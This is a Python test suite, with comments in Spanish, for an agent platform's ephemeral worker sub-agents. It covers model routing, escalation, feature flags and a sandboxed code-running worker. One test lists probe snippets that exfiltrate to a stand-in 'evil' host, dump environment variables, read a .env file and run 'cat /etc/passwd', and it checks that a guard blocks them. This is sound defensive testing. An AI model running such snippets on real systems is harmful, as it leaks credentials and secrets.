#!/usr/bin/env python3
"""verify_workers.py — OLA 4 · §2 · WORKERS EFÍMEROS + AUTO-ROUTING (headless, cero tokens).

Stubea SÓLO el cerebro (monkeypatch de recipe_assembler._route_chat con un guión determinista),
igual molde que verify_delegation_real/verify_b1_multiagente. Prueba el runtime REAL
(assemble_and_run + el branch de workers + workers.py). Sin DB, sin red, sin :8090.

Cubre (§2 / §5 de la ola):
  A. FAN-OUT + EVENTOS   — el cerebro declara-y-reparte → N workers nacen/mueren; eventos por el
                           riel sub_agent_* con ephemeral:true, worker_id único, routed, step_n,
                           model_final REAL por worker; síntesis en el PRINCIPAL (juicio no subdividido).
  B. PLAN + DECOMPOSE    — el paso declara decompose{kind,n,perfil}: se PRESERVA end-to-end (server);
                           perfil overridea el routing; declared=True.
  C. ESCALACIÓN          — worker inválido/vacío → 1 reintento en el PRINCIPAL, narrado (escalated).
  D. FLAG OFF (retro)    — sin PUPPET_WORKERS_ENABLED la tool NO se ofrece; cero worker_runs (byte-idéntico).
  §2b WORKER-GUIÓN       — el cerebro ESCRIBE plomería stdlib; el sandbox la corre; sólo el resumen vuelve.
                           5 checks: (a) A/B tokens, (b) negativo write-world, (c) presupuesto duro (runaway),
                           (d) fidelidad resumen↔efecto real, (e) fuga de datos crudos al contexto. Flag ON sólo acá.
  U. UNIDADES            — routing legible, readonly_schema, presupuesto duro, belt vacío, deny ceiling,
                           model.workers slot, _extract_plan preserva decompose.

Correr:  cd platform/assembler && PYTHONPATH=<wt>/platform <venv>/bin/python verify_workers.py
"""
from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
from pathlib import Path

_HERE = Path(__file__).resolve().parent
_REPO_ROOT = _HERE.parents[1]                 # <wt> (platform/assembler → <wt>)
if str(_HERE) not in sys.path:
    sys.path.insert(0, str(_HERE))

import recipe_assembler as RA          # noqa: E402
import workers as W                    # noqa: E402

_PASS = 0
_FAIL = 0


def _ck(label, ok, ev=""):
    global _PASS, _FAIL
    if ok:
        _PASS += 1
        print(f"  ✓ {label}" + (f"\n      {ev}" if ev else ""))
    else:
        _FAIL += 1
        print(f"  ✗ {label}\n      {ev}")


def _hr(t):
    print("\n" + "═" * 78 + f"\n  {t}\n" + "═" * 78)


# ── cerebro scripteado (reemplaza RA._route_chat) ────────────────────────────────
def _first_user(messages):
    for m in messages:
        if m.get("role") == "user":
            c = m.get("content")
            return c if isinstance(c, str) else json.dumps(c)
    return ""


def _final_resp(text, model):
    return ({"choices": [{"message": {"role": "assistant", "content": text},
                          "finish_reason": "stop"}], "usage": {}}, model)


def _tool_resp(content, calls, model):
    tcs = [{"id": f"call_{i}", "type": "function",
            "function": {"name": n, "arguments": json.dumps(a)}}
           for i, (n, a) in enumerate(calls)]
    return ({"choices": [{"message": {"role": "assistant", "content": content, "tool_calls": tcs},
                          "finish_reason": "tool_calls"}], "usage": {}}, model)


REPARTIR = W.WORKER_TOOL_NAME

# sub-tareas de RECOLECCIÓN (routing económico) + una que la heurística marca juicio (→ principal)
SA1 = "Leé la fuente A y extraé los tickers"
SA2 = "Contá las filas de la hoja B"
SA3 = "Priorizá las 3 fuentes por relevancia"          # 'priorizá' → principal
ESC = "Leé la fuente que va a fallar la primera vez"    # económico; falla el 1er intento

PLAN_B = ('```json\n' + json.dumps({"plan": [
    {"paso": "preparar el terreno", "tool": None},
    {"paso": "repartir la lectura de fuentes", "tool": REPARTIR,
     "decompose": {"kind": "lectores", "n": 3, "perfil": "economico"}},
    {"paso": "sintetizar el resultado", "tool": None},
]}, ensure_ascii=False) + '\n```')

# ── §2b · WORKER-GUIÓN — sub-tarea de plomería de datos + el script que el cerebro "escribe" ──
# El lote CRUDO (2000 filas 'ROW-i-VAL-v') existe DE VERDAD en un archivo del sandbox; el cerebro
# escribe el patrón (range/loop), NUNCA los valores expandidos. Sólo el resumen agregado vuelve.
GS_SUM = ("Construí un lote de 2000 filas 'ROW-i-VAL-v' (v=(i*7)%1000), guardalo en un archivo, "
          "sumá el campo VAL y devolvé SÓLO el conteo y el total (jamás las filas crudas).")
GUION_SCRIPT = '''Listo, este guión hace la plomería y sólo imprime el agregado:
```python
rows = ['ROW-%d-VAL-%d' % (i, (i * 7) % 1000) for i in range(2000)]
with open('lote.txt', 'w') as f:
    f.write(chr(10).join(rows))
with open('lote.txt') as f:
    data = [ln for ln in f.read().splitlines() if ln]
total = sum(int(r.split('-')[3]) for r in data)
print('filas=%d suma_total=%d' % (len(data), total))
```'''


class WBrain:
    """Guión determinista, keyado por primer mensaje de usuario. idx = nº de 'assistant' en ESTE
    run (per-run). gcount = contador GLOBAL por key (para simular la escalación cross-run)."""

    def __init__(self):
        self.lock = threading.Lock()
        self.seen: list = []      # {key, primary, max_tokens, tools, toolmsgs}
        self.gcount: dict = {}

    def route(self, messages, tools, *, base_url=None, primary=None, fallback=None,
              api_key=None, max_tokens=None, temperature=None, route_log=None,
              on_tier_error=None, **_kw):
        key = _first_user(messages)
        idx = sum(1 for m in messages if m.get("role") == "assistant")
        toolnames = [(t.get("function") or {}).get("name") for t in (tools or [])]
        toolmsgs = [str(m.get("content", "")) for m in messages if m.get("role") == "tool"]
        with self.lock:
            gc = self.gcount.get(key, 0)
            self.gcount[key] = gc + 1
            self.seen.append({"key": key, "primary": primary, "max_tokens": max_tokens,
                              "tools": toolnames, "toolmsgs": toolmsgs, "idx": idx})
        if route_log is not None:
            route_log.append({"tier": "test", "model": primary, "ok": True})

        # ── PADRES (Núcleo) ──
        if key == "NUCLEO_A":
            if idx == 0:
                return _tool_resp("", [(REPARTIR, {"step_n": 2, "kind": "lectores",
                                                   "subtareas": [SA1, SA2, SA3]})], primary)
            return _final_resp("SÍNTESIS_A: junté los 3 hallazgos y decido.", primary)
        if key == "NUCLEO_B":
            if idx == 0:
                return _tool_resp(PLAN_B, [(REPARTIR, {"step_n": 2, "kind": "lectores",
                                                       "subtareas": [SA1, SA3]})], primary)
            return _final_resp("SÍNTESIS_B: con el plan declarado.", primary)
        if key == "NUCLEO_C":
            if idx == 0:
                return _tool_resp("", [(REPARTIR, {"step_n": 1, "subtareas": [ESC]})], primary)
            return _final_resp("SÍNTESIS_C: tras la escalación.", primary)
        if key == "NUCLEO_D":
            return _final_resp("Respuesta directa, sin repartir (flag off).", primary)
        if key == "NUCLEO_G":
            if idx == 0:
                return _tool_resp("", [(REPARTIR, {"step_n": 1, "kind": "guion",
                                                   "subtareas": [GS_SUM]})], primary)
            return _final_resp("SÍNTESIS_G: el guión sumó el lote; el total es coherente.", primary)

        # ── WORKERS (sub-tareas) ──
        if key == GS_SUM:
            # el cerebro-guión devuelve un SCRIPT (bloque ```python```): plomería stdlib pura.
            return _final_resp(GUION_SCRIPT, primary)
        if key == ESC:
            # 1er intento GLOBAL (económico) → FALLA de verdad (el modelo se cae → run ok=False,
            # que el motor NO repara); reintento (principal) → válido. (Un answer vacío no sirve:
            # el motor fuerza una síntesis y lo repara dentro del MISMO intento.)
            if gc == 0:
                raise RuntimeError("worker económico se cayó (simulado)")
            return _final_resp("hallazgo (reintento): la fuente se leyó al segundo intento", primary)
        # cualquier otra sub-tarea → hallazgo válido
        return _final_resp(f"hallazgo: {key[:40]}", primary)


class _Patched:
    def __init__(self, brain):
        self.brain = brain

    def __enter__(self):
        self._orig = RA._route_chat
        RA._route_chat = self.brain.route
        return self.brain

    def __exit__(self, *a):
        RA._route_chat = self._orig


def _recipe():
    return {
        "schema_version": "v1",
        "meta": {"name": "nucleo-test", "nicho": "general",
                 "descripcion": "Núcleo que descompone en workers"},
        "model": {"primary": "principal-brain", "base_url": "stub://local",
                  "temperature": 0, "max_tokens": 256, "max_turns": 8,
                  # slot workers (§2.6): el cerebro ECONÓMICO de los workers
                  "workers": {"primary": "econ-oss", "base_url": "stub://local", "max_tokens": 5000}},
        "belt": {"belt_ref": W._EMPTY_BELT_REF},   # Núcleo sin belt propio: sólo la tool de descomposición
        "rag": {"enabled": False},
        "gates": {},
    }


def _run(prompt, *, workers_on=True, on_event=None, recipe=None):
    prev = os.environ.get("PUPPET_WORKERS_ENABLED")
    if workers_on:
        os.environ["PUPPET_WORKERS_ENABLED"] = "1"
    else:
        os.environ.pop("PUPPET_WORKERS_ENABLED", None)
    try:
        wd = tempfile.mkdtemp(prefix="ola4-workers-")
        return RA.assemble_and_run(recipe or _recipe(), prompt, repo_root=_REPO_ROOT,
                                   deadline_s=60.0, workdir=wd, on_event=on_event)
    finally:
        if prev is None:
            os.environ.pop("PUPPET_WORKERS_ENABLED", None)
        else:
            os.environ["PUPPET_WORKERS_ENABLED"] = prev


def _worker_events(events, typ):
    return [e for e in events if e.get("type") == typ and e.get("ephemeral")]


# ════════════════════════════════════════════════════════════════════════════════
# A · FAN-OUT + EVENTOS + ROUTING + model_final + read-only + curaduría + síntesis
# ════════════════════════════════════════════════════════════════════════════════
def test_A():
    _hr("A · FAN-OUT + EVENTOS + ROUTING + model_final + read-only + síntesis")
    brain = WBrain()
    events: list = []
    with _Patched(brain):
        rec = _run("NUCLEO_A", on_event=events.append)

    started = _worker_events(events, "sub_agent_started")
    finished = _worker_events(events, "sub_agent_finished")
    wruns = rec.get("worker_runs", [])

    _ck("A.1 · 3 workers nacieron y murieron (eventos ephemeral)",
        len(started) == 3 and len(finished) == 3 and len(wruns) == 3,
        f"started={len(started)} finished={len(finished)} worker_runs={len(wruns)}")

    ids = [e.get("worker_id") for e in finished]
    _ck("A.2 · worker_id ÚNICO por instancia (resuelve el gotcha del slug)",
        len(ids) == len(set(ids)) and all(ids),
        f"worker_ids={ids}")

    _ck("A.3 · TODO evento de worker lleva ephemeral:true (el diorama los filtra · §1)",
        all(e.get("ephemeral") is True for e in started + finished)
        and all(e.get("worker_kind") == "lectores" for e in finished),
        f"ephemeral ok; kinds={[e.get('worker_kind') for e in finished]}")

    routed = {e["worker_id"]: e.get("routed") for e in finished}
    modelf = {e["worker_id"]: e.get("model_final") for e in finished}
    # SA1/SA2 → económico (econ-oss) · SA3 'priorizá' → principal (principal-brain)
    by_task = {r.get("subtask"): r for r in wruns}
    econ_ok = (by_task[SA1[:1200]]["routed"] == "economico"
               and by_task[SA2[:1200]]["routed"] == "economico"
               and by_task[SA3[:1200]]["routed"] == "principal")
    _ck("A.4 · AUTO-ROUTING legible: leer/contar→económico, priorizá→principal",
        econ_ok,
        f"routed por subtarea: {[ (t[:14], r['routed']) for t,r in by_task.items() ]}")

    mf_econ = {by_task[SA1[:1200]]["model_final"], by_task[SA2[:1200]]["model_final"]}
    mf_prin = by_task[SA3[:1200]]["model_final"]
    _ck("A.5 · model_final REAL por worker (económico≠principal; ninguno fabricado)",
        mf_econ == {"econ-oss"} and mf_prin == "principal-brain"
        and all(modelf.values()),
        f"económico model_final={mf_econ} · principal={mf_prin}")

    # read-only: cada worker vio CERO tools de mundo (belt vacío → solo-lectura fuerte)
    worker_calls = [s for s in brain.seen if s["key"] in (SA1, SA2, SA3)]
    _ck("A.6 · PODERES SOLO-LECTURA: el worker no ve NINGUNA tool de mundo (§2.3 negativo)",
        len(worker_calls) == 3 and all(s["tools"] == [] for s in worker_calls),
        f"tools vistas por workers={[s['tools'] for s in worker_calls]}")

    # curaduría: el input del worker = la sub-tarea (no el transcript del padre)
    _ck("A.7 · CURADURÍA de contexto: el worker recibe SÓLO su sub-tarea (no el transcript)",
        all(s["key"] in (SA1, SA2, SA3) and s["toolmsgs"] == [] for s in worker_calls)
        and all((r["spent"]["input_tokens_est"] < 200) for r in wruns),
        f"keys de worker={[s['key'][:14] for s in worker_calls]}; "
        f"input_tokens_est={[r['spent']['input_tokens_est'] for r in wruns]}")

    # presupuesto duro: cada worker corrió con max_tokens ≤ cap (700), aunque el slot pedía 5000
    _ck("A.8 · PRESUPUESTO DURO: el worker corre con max_tokens ≤ 700 (aunque el slot pedía 5000)",
        all(s["max_tokens"] and s["max_tokens"] <= W._WORKER_TOKEN_CAP for s in worker_calls),
        f"max_tokens de workers={[s['max_tokens'] for s in worker_calls]}")

    # síntesis en el principal: el Núcleo VIO el bridge (hallazgos) y sintetizó; juicio no subdividido
    parent_synth = [s for s in brain.seen if s["key"] == "NUCLEO_A" and s["idx"] == 1]
    saw_bridge = parent_synth and any("hallazgo" in tm or "resumen" in tm
                                      for tm in parent_synth[0]["toolmsgs"])
    _ck("A.9 · SÍNTESIS en el PRINCIPAL: el Núcleo consumió los hallazgos y decidió (juicio no subdividido)",
        bool(saw_bridge) and rec.get("answer", "").startswith("SÍNTESIS_A"),
        f"padre vio bridge={bool(saw_bridge)}; answer={rec.get('answer','')[:40]!r}")

    # cero held (workers read-only)
    _ck("A.10 · workers read-only → CERO acciones retenidas",
        all(r.get("held", 0) == 0 for r in wruns)
        and all(e.get("held", 0) == 0 for e in finished),
        f"held por worker={[r.get('held') for r in wruns]}")


# ════════════════════════════════════════════════════════════════════════════════
# B · PLAN + DECOMPOSE (preservado end-to-end; perfil overridea; declared=True)
# ════════════════════════════════════════════════════════════════════════════════
def test_B():
    _hr("B · PLAN DECLARADO + DECOMPOSE (preservado; perfil overridea; declared)")
    brain = WBrain()
    events: list = []
    with _Patched(brain):
        rec = _run("NUCLEO_B", on_event=events.append)

    plan = rec.get("plan") or []
    step2 = next((s for s in plan if s.get("n") == 2), None)
    dec = (step2 or {}).get("decompose")
    _ck("B.1 · `decompose` PRESERVADO en el plan (server no lo tira)",
        isinstance(dec, dict) and dec.get("kind") == "lectores" and dec.get("perfil") == "economico"
        and dec.get("n") == 3,
        f"plan step2.decompose={dec}")

    finished = _worker_events(events, "sub_agent_finished")
    _ck("B.2 · perfil='economico' declarado OVERRIDEA la heurística (hasta 'priorizá' va económico)",
        len(finished) == 2 and all(e.get("routed") == "economico" for e in finished)
        and all(e.get("model_final") == "econ-oss" for e in finished),
        f"routed={[e.get('routed') for e in finished]} model_final={[e.get('model_final') for e in finished]}")

    _ck("B.3 · declared=True (la descomposición estaba en el plan · jamás invisible) + step_n ligado",
        all(e.get("declared") is True and e.get("step_n") == 2 for e in _worker_events(events, "sub_agent_started")),
        f"started declared/step_n={[(e.get('declared'), e.get('step_n')) for e in _worker_events(events,'sub_agent_started')]}")


# ════════════════════════════════════════════════════════════════════════════════
# C · ESCALACIÓN NARRADA (worker inválido → 1 reintento en el principal)
# ════════════════════════════════════════════════════════════════════════════════
def test_C():
    _hr("C · ESCALACIÓN NARRADA (worker inválido/vacío → reintento en el PRINCIPAL)")
    brain = WBrain()
    events: list = []
    with _Patched(brain):
        rec = _run("NUCLEO_C", on_event=events.append)

    wruns = rec.get("worker_runs", [])
    finished = _worker_events(events, "sub_agent_finished")
    esc = wruns[0].get("escalated") if wruns else None
    _ck("C.1 · escalated.retried=True (narrado), del económico al principal",
        len(wruns) == 1 and isinstance(esc, dict) and esc.get("retried") is True
        and esc.get("to") == "principal-brain",
        f"escalated={esc}")

    _ck("C.2 · tras la escalación el worker CIERRA ok (2do intento válido) y el evento lo lleva",
        wruns and wruns[0].get("ok") is True
        and finished and finished[0].get("escalated", {}).get("retried") is True
        and finished[0].get("model_final") == "principal-brain",
        f"ok={wruns[0].get('ok') if wruns else None}; ev.model_final={finished[0].get('model_final') if finished else None}")


# ════════════════════════════════════════════════════════════════════════════════
# D · FLAG OFF (retro-compat: la tool no se ofrece; cero worker_runs)
# ════════════════════════════════════════════════════════════════════════════════
def test_D():
    _hr("D · FLAG OFF — retro-compat byte-idéntica (la tool NO se ofrece)")
    brain = WBrain()
    events: list = []
    # Núcleo con belt REAL (para que arranque con flag off): assertamos que igual NO ve la tool.
    belted = _recipe()
    belted["belt"] = {"belt_ref": "platform/assembler/deleg_fixtures/belt-deleg.mcp.json"}
    with _Patched(brain):
        rec = _run("NUCLEO_D", workers_on=False, on_event=events.append, recipe=belted)

    parent_calls = [s for s in brain.seen if s["key"] == "NUCLEO_D"]
    tool_offered = any(REPARTIR in (s["tools"] or []) for s in parent_calls)
    _ck("D.1 · con flag OFF, repartir_en_workers NO se ofrece al cerebro",
        not tool_offered and len(parent_calls) >= 1,
        f"tools vistas por el Núcleo={parent_calls[0]['tools'] if parent_calls else '∅'}")

    _ck("D.2 · cero worker_runs y cero eventos ephemeral (paso corre como hoy)",
        not rec.get("worker_runs") and not _worker_events(events, "sub_agent_started"),
        f"worker_runs={rec.get('worker_runs')}; ephemeral_started={len(_worker_events(events,'sub_agent_started'))}")


# ════════════════════════════════════════════════════════════════════════════════
# E · CONCURRENCIA + SERIALIZACIÓN NARRADA (§2.6) — unit de run_workers con runner stub
# ════════════════════════════════════════════════════════════════════════════════
def test_serialization():
    import time as _t
    _hr("E · CONCURRENCIA + SERIALIZACIÓN NARRADA (§2.6)")

    def _stub_runner(recipe, prompt, **kw):
        return {"ok": True, "answer": f"ok:{prompt[:8]}", "truncated": False,
                "model_final": (recipe.get("model") or {}).get("primary")}

    base = dict(runner=_stub_runner, parent_model_cfg={"primary": "principal-brain"},
                repo_root=_REPO_ROOT, byok_resolver=None, user_id=None, run_id="r",
                depth=0, deadline_abs=_t.monotonic() + 60, agent_stack=(), parent_workdir=None, turn=1)

    out_local = W.run_workers(["leer a", "leer b", "leer c"], kind="lectores", perfil="auto", step_n=1,
                              workers_model_cfg={"primary": "qwen", "base_url": "http://localhost:11434/v1"}, **base)
    _ck("E.1 · provider LOCAL → serialización narrada (provider_saturated) + workers ok",
        out_local["serialized"] and out_local["serialized"]["cause"] == "provider_saturated"
        and len(out_local["results"]) == 3 and all(r["ok"] for r in out_local["results"]),
        f"serialized={out_local['serialized']}")

    out_tier = W.run_workers(["leer a", "leer b", "leer c"], kind="lectores", perfil="auto", step_n=1,
                             workers_model_cfg={"primary": "econ", "base_url": "https://api.groq.com/openai/v1"},
                             caps_ceiling={"max_parallel": 1}, **base)
    _ck("E.2 · cap de tier (max_parallel=1) < pedidos → serialización narrada (tier_cap)",
        out_tier["serialized"] and out_tier["serialized"]["cause"] == "tier_cap"
        and out_tier["serialized"]["max_parallel"] == 1,
        f"serialized={out_tier['serialized']}")

    out_free = W.run_workers(["leer a", "leer b"], kind="lectores", perfil="auto", step_n=1,
                             workers_model_cfg={"primary": "econ", "base_url": "https://api.groq.com/openai/v1"}, **base)
    _ck("E.3 · remoto + sin cap → NO serializa (paralelo real)",
        out_free["serialized"] is None and len(out_free["results"]) == 2 and all(r["ok"] for r in out_free["results"]),
        f"serialized={out_free['serialized']}")


# ════════════════════════════════════════════════════════════════════════════════
# §2b · WORKER-GUIÓN (flag ON sólo acá; OFF por default en la ola). Las 5 verificaciones
# que pide la misión: (a) A/B tokens · (b) negativo write-world · (c) presupuesto duro ·
# (d) fidelidad del resumen vs. efecto real · (e) fuga de datos crudos al contexto.
# ════════════════════════════════════════════════════════════════════════════════
def test_guion():
    _hr("§2b · WORKER-GUIÓN — código en sandbox (flag ON acá; el default de la ola es OFF)")

    # (c) PRESUPUESTO DURO — un guión runaway se mata por timeout de pared y se narra.
    sb_run = W._run_guion_code("while True:\n    _x = 1\n", None, timeout_s=2)
    _ck("§2b.c · PRESUPUESTO DURO: guión runaway (while True) → MATADO por timeout + narrado",
        sb_run["timed_out"] is True and sb_run["ok"] is False and "matado" in sb_run["stderr"],
        f"timed_out={sb_run['timed_out']} ok={sb_run['ok']} stderr={sb_run['stderr'][:56]!r}")

    # (b) NEGATIVO write-world — el GUARD de admisión (review §5 HIGH) RECHAZA el guión ANTES de
    # correr si intenta red (socket/urllib), subprocess/fork, o leer credenciales/entorno. `python3 -I`
    # NO aísla red ni filesystem por sí solo, así que la exfiltración se corta en la admisión estática.
    probes = {
        "env":  "import os\nprint(dict(os.environ))\n",                       # leer entorno del run
        "url":  "import urllib.request\nurllib.request.urlopen('http://evil/x')\n",  # egress HTTP
        "sock": "import socket\ns = socket.socket()\ns.connect(('evil', 80))\n",     # red cruda
        "cred": "print(open('/some/path/.env').read())\n",                    # archivo de secretos
        "sub":  "import subprocess\nsubprocess.run(['cat', '/etc/passwd'])\n", # shell-out
        "fork": "import os\nif os.fork() == 0:\n    os.setsid()\n",            # doble-fork / desprender
    }
    blk = {k: W._run_guion_code(src, None) for k, src in probes.items()}
    all_blocked = all(r.get("blocked") is True and r["ok"] is False and "bloqueado" in r["stderr"]
                      for r in blk.values())
    _ck("§2b.b · NEGATIVO write-world: el GUARD rechaza ANTES de correr red/subprocess/fork/credenciales "
        "(no existe la capacidad de exfiltrar ni tocar el mundo)",
        all_blocked, "bloqueados: " + ", ".join(f"{k}={blk[k].get('blocked')}" for k in probes))

    # (a)/(d)/(e) — el guión REAL a través del MOTOR (flag ON), un solo run.
    prev_g = os.environ.get("PUPPET_GUION_ENABLED")
    os.environ["PUPPET_GUION_ENABLED"] = "1"
    brain = WBrain()
    events: list = []
    try:
        with _Patched(brain):
            rec = _run("NUCLEO_G", on_event=events.append)
    finally:
        if prev_g is None:
            os.environ.pop("PUPPET_GUION_ENABLED", None)
        else:
            os.environ["PUPPET_GUION_ENABLED"] = prev_g

    wruns = rec.get("worker_runs", [])
    g = wruns[0] if wruns else {}
    started = _worker_events(events, "sub_agent_started")
    finished = _worker_events(events, "sub_agent_finished")

    # (d) FIDELIDAD — el resumen que vuelve = el efecto REAL del código corrido (diff exacto).
    exp = sum((i * 7) % 1000 for i in range(2000))
    _ck("§2b.d · FIDELIDAD: el resumen vuelto = el efecto REAL del guión (filas=2000, suma verificada)",
        g.get("ok") is True and "filas=2000" in (g.get("answer") or "")
        and f"suma_total={exp}" in (g.get("answer") or "")
        and (g.get("sandbox") or {}).get("returncode") == 0,
        f"answer={g.get('answer')!r} · esperado suma_total={exp} · sandbox={g.get('sandbox')}")

    # (e) FUGA DE DATOS — las filas CRUDAS existen en el archivo del sandbox pero NO aparecen ni en
    # el resumen ni en NINGÚN mensaje que vio el cerebro (assert sobre todo el contexto del cerebro).
    all_ctx = " ".join(s["key"] for s in brain.seen) + " " + \
        " ".join(tm for s in brain.seen for tm in s["toolmsgs"]) + " " + (g.get("answer") or "")
    raw_markers = ["ROW-500-VAL-500", "ROW-1234-VAL-638", "ROW-1999-VAL-993"]  # filas expandidas reales
    leaked = [mk for mk in raw_markers if mk in all_ctx]
    _ck("§2b.e · FUGA DE DATOS: las filas crudas viven en el archivo del sandbox pero NO entran al "
        "contexto del cerebro ni al resumen (sólo el agregado)",
        g.get("ok") and not leaked and len(g.get("answer") or "") < 200,
        f"leaked={leaked} answer_len={len(g.get('answer') or '')} answer={g.get('answer')!r}")

    # el guión es INSPECCIONABLE (código view-only en el record) + riel ephemeral con worker_kind='guion'
    _ck("§2b · INSPECCIONABLE: el código queda view-only en el record + worker_kind='guion' + ephemeral",
        "range(2000)" in (g.get("script") or "") and g.get("worker_kind") == "guion"
        and started and started[0].get("worker_kind") == "guion" and started[0].get("ephemeral") is True
        and finished and finished[0].get("ephemeral") is True,
        f"script⊃range={'range(2000)' in (g.get('script') or '')} kind={g.get('worker_kind')} "
        f"ev.kind={finished[0].get('worker_kind') if finished else None}")

    # (a) A/B TOKENS — mismo cómputo CON guión (el cerebro no ingiere el lote) vs. SIN (lote en contexto).
    rows = ['ROW-%d-VAL-%d' % (i, (i * 7) % 1000) for i in range(2000)]
    direct = W._est_tokens("\n".join(rows))                       # el lote crudo en el contexto del cerebro
    guion_in = (g.get("spent") or {}).get("input_tokens_est", 10 ** 9)
    saving = 1 - guion_in / max(1, direct)
    _ck("§2b.a · A/B TOKENS: el cerebro del guión NO ingiere los datos → ahorro grande vs. el lote en contexto",
        guion_in < direct * 0.5,
        f"guión_input≈{guion_in} tok · directo(lote en contexto)≈{direct} tok → ahorro ≈ {saving:.0%}")


# ════════════════════════════════════════════════════════════════════════════════
# U · UNIDADES (routing, readonly, presupuesto, belt vacío, deny, slot, plan)
# ════════════════════════════════════════════════════════════════════════════════
def test_units():
    _hr("U · UNIDADES")
    _ck("U.1 · routing legible", (
        W.route_subtask("leé el csv")[0] == "economico"
        and W.route_subtask("sintetizá y decidí")[0] == "principal"
        and W.route_subtask("priorizá")[0] == "principal"
        and W.route_subtask("cosa rara")[0] == "economico"           # default recolector
        and W.route_subtask("cualquiera", "principal")[0] == "principal"   # perfil override
    ), "económico/principal/default/override")

    kept = [(x.get("function") or {}).get("name")
            for x in W.readonly_schema([{"function": {"name": "read_x"}},
                                        {"function": {"name": "send_mail"}},
                                        {"function": {"name": "place_order"}},
                                        {"function": {"name": "delete_repo"}},
                                        {"function": {"name": "list_rows"}}])]
    _ck("U.2 · readonly_schema deja SÓLO lectura (send/money/write AUSENTES)",
        kept == ["read_x", "list_rows"], f"kept={kept}")

    r = W.build_worker_recipe("sub", "lectores", model_cfg={"primary": "m", "max_tokens": 9000},
                              token_cap=W._WORKER_TOKEN_CAP, turn_cap=W._WORKER_TURN_CAP)
    _ck("U.3 · build_worker_recipe: belt sin servers (pura-cognición) + presupuesto duro",
        r["belt"] == {"belt_ref": W._EMPTY_BELT_REF}
        and r["model"]["max_tokens"] == W._WORKER_TOKEN_CAP
        and r["model"]["max_turns"] == W._WORKER_TURN_CAP,
        f"belt={r['belt']} max_tokens={r['model']['max_tokens']} max_turns={r['model']['max_turns']}")

    dc = W.worker_deny_ceiling()
    _ck("U.4 · deny ceiling (defensa-en-profundidad): send + money",
        "send" in dc["deny_classes"] and "money_touch" in dc["deny_classes"], f"{dc}")

    _ck("U.5 · slot model.workers: presente→económico; ausente→hereda",
        W.resolve_workers_model({"workers": {"primary": "e"}}) == {"primary": "e"}
        and W.resolve_workers_model({"primary": "x"}) is None, "")

    steps, _clean = RA._extract_plan(PLAN_B)
    s2 = next((s for s in steps if s["n"] == 2), None)
    _ck("U.6 · _extract_plan PRESERVA decompose (retro-compat: sin el campo, paso normal)",
        s2 and s2.get("decompose", {}).get("kind") == "lectores"
        and s2["decompose"]["perfil"] == "economico"
        and RA._extract_plan('```json\n{"plan":[{"paso":"x","tool":null}]}\n```')[0][0].get("decompose") is None,
        f"step2.decompose={s2.get('decompose') if s2 else None}")

    _ck("U.7 · flags: workers OFF por default; guion OFF por default",
        not W.guion_enabled(), "guion.enabled default OFF (§2b)")


def main():
    print("OLA 4 · §2+§2b · verify_workers — WORKERS EFÍMEROS + AUTO-ROUTING + GUIÓN (headless)")
    test_A()
    test_B()
    test_C()
    test_D()
    test_serialization()
    test_guion()
    test_units()
    # [H3] La barra decorativa va ARRIBA: la ÚLTIMA línea de una vara es su veredicto.
    print("\n" + "═" * 78)
    total = _PASS + _FAIL
    verd = "TODO VERDE" if _FAIL == 0 else "ALGO NO CIERRA"
    print(f"  RESULTADO §2+§2b: {_PASS}/{total} passed · {_FAIL} failed — {verd}")
    sys.exit(0 if _FAIL == 0 else 1)


if __name__ == "__main__":
    main()
